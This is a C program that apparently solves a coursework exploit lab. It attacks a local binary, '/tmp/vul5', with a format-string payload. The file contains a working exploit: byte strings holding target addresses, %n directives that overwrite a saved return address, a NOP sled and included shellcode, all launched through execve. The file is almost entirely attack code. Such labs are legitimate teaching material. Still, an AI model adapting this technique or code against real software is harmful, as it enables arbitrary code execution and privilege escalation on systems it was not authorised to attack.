#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"



int main(void)
{
  char payload[400];
  memset(payload, 0x90, 400);

  unsigned int buf_addr = 0xbffffb4c;
  unsigned int snprintf_return_addr = 0xbffffb3c;

  char *format_string = 
      "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
      "\xff\xff\xff\xff\x3d\xfb\xff\xbf" 
      "\xff\xff\xff\xff\x3e\xfb\xff\xbf" 
      "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
      "%68u%n"
      "%155u%n"
      "%256u%n"
      "%192u%n";
//0xbfffff64
  memcpy(payload, format_string, strlen(format_string));
  unsigned int shellcode_offset = strlen(format_string) + 200;

  memcpy(payload + shellcode_offset, shellcode, strlen(shellcode));
      

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
